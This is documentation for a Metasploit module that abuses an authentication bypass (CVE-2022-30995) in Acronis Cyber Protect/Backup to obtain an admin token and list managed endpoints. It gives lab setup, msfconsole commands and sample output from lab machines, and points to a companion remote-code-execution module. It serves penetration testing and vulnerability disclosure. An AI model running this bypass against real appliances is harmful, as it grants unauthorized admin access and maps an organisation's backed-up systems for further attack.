## Vulnerable Application
Acronis Cyber Protect or Backup is an enterprise backup/recovery solution for all, compute, storage and application resources.
Businesses and Service Providers are using it to protect and backup all IT assets in their IT environment.

This module exploits an authentication bypass vulnerability at the Acronis Cyber Protect appliance which,
in its default configuration, allows the anonymous registration of new backup/protection agents on new endpoints.
This API endpoint also generates bearer tokens which the agent then uses to authenticate to the appliance.
As the management web console is running on the same port as the API for the agents,
this bearer token is also valid for any actions on the web console.
This allows an attacker with network access to the appliance to start the registration of a new agent,
retrieve a bearer token that provides admin access to the available functions in the web console.

This module will gather all machine info (endpoints) configured and managed by the appliance.
This information can be used in a subsequent attack that exploits this vulnerability to execute arbitrary commands
on both the managed endpoint and the appliance itself.
This exploit is covered in another module `exploit/multi/acronis_cyber_protect_unauth_rce_cve_2022_3405`.

Acronis Cyber Protect 15 (Windows, Linux) before build 29486 and
Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545 are vulnerable.

The following releases were tested.

**Acronis Cyber Protect 15  ISO appliances:**
* Acronis Cyber Protect 15 Build 28503
* Acronis Cyber Protect 15 Build 27009
* Acronis Cyber Protect 15 Build 26981
* Acronis Cyber Protect 15 Build 26172

**Acronis Cyber Protect 12.5  ISO appliances:**
* Acronis Cyber Protect 12.5 Build 16428
* Acronis Cyber Protect 12.5 Build 16386
* Acronis Cyber Protect 12.5 Build 14330
* Acronis Cyber Protect 12.5 Build 11010

## Installation steps to install the Acronis Cyber Protect/Backup appliance
* Install the virtualization engine VMware Fusion on your preferred platform.
* [Install VMware Fusion on MacOS](https://knowledge.broadcom.com/external/article/315638/download-and-install-vmware-fusion.html).
* [Download ISO Image](https://care.acronis.com/s/article/71847-Acronis-Cyber-Protect-Links-to-download-installation-files?language=en_US).
* Install the Acronis iso image in your virtualization engine by unzipping the appliance image and import the `ovf` image.
* During the boot, select `Install appliance` and  configure the installation settings such as setting the root password and IP address
* using the option `change installation settings`.
* Boot up the VM and should be able to access the Acronis Cyber Protect/Backup appliance either thru the console, `ssh` on port `22`
* via the `webui` via `http://your_ip:9877`.
* Ensure that you have registered yourself on the Acronis Web site and applied for the 30-days trial for Acronis Cyber Protect.
* Login into the appliance via the `webui`.
* Follow the license instructions to apply your 30-day trial license.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `auxiliary/gather/acronis_cyber_protect_machine_info_disclosure`
- [ ] `set rhosts <ip-target>`
- [ ] `run`
- [ ] you should get a list of all endpoints that are registered at the appliance.

## Options
### OUTPUT
You can use option `table` to print output of the gather info to the console (default).
Choosing option `json` will store all information at a file in `json` format at the loot directory.
You can use this file in combination with `jq` for offline queries and processing.

## Scenarios
```msf
msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > info

       Name: Acronis Cyber Protect/Backup machine info disclosure
     Module: auxiliary/gather/acronis_cyber_protect_machine_info_disclosure
    License: Metasploit Framework License (BSD)
       Rank: Excellent

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Sandro Tolksdorf of usd AG.

Module side effects:
 artifacts-on-disk
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  OUTPUT     table            yes       Output format to use (Accepted: table, json)
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                        metasploit.html
  RPORT      9877             yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The URI of the vulnerable Acronis Cyber Protect/Backup instance
  VHOST                       no        HTTP server virtual host

Description:
  Acronis Cyber Protect or Backup is an enterprise backup/recovery solution for all,
  compute, storage and application resources. Businesses and Service Providers are using it
  to protect and backup all IT assets in their IT environment.
  This module exploits an authentication bypass vulnerability at the Acronis Cyber Protect
  appliance which, in its default configuration, allows the anonymous registration of new
  backup/protection agents on new endpoints. This API endpoint also generates bearer tokens
  which the agent then uses to authenticate to the appliance.
  As the management web console is running on the same port as the API for the agents, this
  bearer token is also valid for any actions on the web console. This allows an attacker
  with network access to the appliance to start the registration of a new agent, retrieve
  a bearer token that provides admin access to the available functions in the web console.

  This module will gather all machine info (endpoints) configured and managed by the appliance.
  This information can be used in a subsequent attack that exploits this vulnerability to
  execute arbitrary commands on both the managed endpoint and the appliance which is covered
  in another module `exploit/multi/acronis_cyber_protect_unauth_rce_cve_2022_3405`.

  Acronis Cyber Protect 15 (Windows, Linux) before build 29486 and
  Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545 are vulnerable.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2022-30995
  https://nvd.nist.gov/vuln/detail/CVE-2022-3405
  https://herolab.usd.de/security-advisories/usd-2022-0008/
  https://attackerkb.com/topics/27RudJXbN4/cve-2022-30995

View the full module info with the info -d command.
```
### Acronis Cyber Backup 12.5 build 14330 VMware appliance
```msf
msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > run

[*] Running module against 192.168.201.6
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Retrieve the first access token.
[*] Register a dummy backup agent.
[*] Dummy backup agent registration is successful.
[*] Retrieve the second access token.
[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 12.5.14330
[*] Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.
[*] List the managed endpoints registered at the Acronis Cyber Protect/Backup appliance.
[*] ----------------------------------------
[+] hostId: 28BAFD9F-F9F1-481F-A970-1A6ED70736AC
[+] parentId: phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks
[+] key: phm.0CA16CD4-1C6D-44D2-BEF1-B9F146005EE1@28BAFD9F-F9F1-481F-A970-1A6ED70736AC.disks
[*] type: machine
[*] hostname: WIN-BJDNH44EEDB
[*] IP: 192.168.201.5
[*] OS: Microsoft Windows Server 2019 Standard
[*] ARCH: windows
[*] ONLINE: false
[*] ----------------------------------------
[+] hostId: 345C3F1E-92C3-4E92-8EF8-AC6BF136BB83
[+] parentId: phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks
[+] key: phm.F70D1B08-5097-4CE5-8E22-F9E0DB75401F@345C3F1E-92C3-4E92-8EF8-AC6BF136BB83.disks
[*] type: machine
[*] hostname: AcronisAppliance-AC319
[*] IP: 192.168.201.6
[*] OS: GNU/Linux
[*] ARCH: linux
[*] ONLINE: true
[*] Auxiliary module execution completed
```
### Acronis Cyber Backup 15 build 27009 VMware appliance
```msf
msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > run
[*] Running module against 192.168.201.6

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Retrieve the first access token.
[*] Register a dummy backup agent.
[*] Dummy backup agent registration is successful.
[*] Retrieve the second access token.
[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 15.0.27009
[*] Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.
[*] List the managed endpoints registered at the Acronis Cyber Protect/Backup appliance.
[*] ----------------------------------------
[+] hostId: D287E868-EDBB-4FE9-85A9-F928AA10EE5D
[+] parentId: 00000000-0000-0000-0000-000000000000
[+] key: phm.EA9A6E26-38B5-4727-9957-FD7CDD7BF2CC@D287E868-EDBB-4FE9-85A9-F928AA10EE5D.disks
[*] type: machine
[*] hostname: AcronisAppliance-FCD94
[*] IP: 192.168.201.6
[*] OS: Linux: CentOS Linux release 7.6.1810 (Core)
[*] ARCH: linux
[*] ONLINE: true
[*] ----------------------------------------
[+] hostId: C0FBDC6F-A5FE-4710-ADE8-99B3F8A7CE1E
[+] parentId: 00000000-0000-0000-0000-000000000000
[+] key: phm.1100195A-112E-4904-A933-264C2D12A4A5@C0FBDC6F-A5FE-4710-ADE8-99B3F8A7CE1E.disks
[*] type: machine
[*] hostname: victim.evil.corp
[*] IP: 192.168.201.2
[*] OS: Microsoft Windows Server 2022 Standard
[*] ARCH: windows
[*] ONLINE: false
[*] Auxiliary module execution completed
```

## Limitations
No limitations.
